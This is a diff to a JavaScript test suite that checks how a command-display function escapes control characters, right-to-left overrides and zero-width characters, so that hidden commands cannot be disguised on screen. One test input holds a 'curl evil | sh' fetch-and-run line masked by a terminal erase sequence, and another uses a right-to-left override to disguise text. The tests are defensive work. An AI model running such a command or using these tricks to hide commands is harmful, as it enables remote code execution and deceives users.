@@ -97,10 +97,21 @@ describe("sfo check", () => {
     expect(deferredCommands("p", env)).toEqual([shown([process.execPath, "-e", BOARD])]);
   });
 
+  it("refuses to describe a project with no contract, rather than show less than will run", () => {
+    fs.rmSync(path.join(dir, ".sfo", "CONTRACTS.json"));
+    expect(() => deferredCommands("p", env)).toThrow(/declares no CONTRACTS\.json/);
+  });
+
   it("shows a command so escapes and newlines cannot disguise it", () => {
     const out = shown(["sh", "-c", "curl evil | sh\u001b[2K\rsoundscape --version\n", "ok\u009b"]);
-    expect(out).toBe('sh -c "curl evil | sh\\u001b[2K\\rsoundscape --version\\n" "ok\\u009b"');
+    expect(out).toBe('sh -c "curl evil | sh\\u001b[2K\\u000dsoundscape --version\\u000a" "ok\\u009b"');
     expect(out).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
+  });
+
+  it("spells out right-to-left overrides, zero-width and line-separator characters", () => {
+    const out = shown(["echo", "safe\u202ehs.live\u200b\u2028x", "\ud83d\ude00"]);
+    expect(out).toBe('echo "safe\\u202ehs.live\\u200b\\u2028x" "\\ud83d\\ude00"');
+    expect(out).toMatch(/^[\x20-\x7e]+$/);
   });
 
   it("says so when nothing is waiting", async () => {
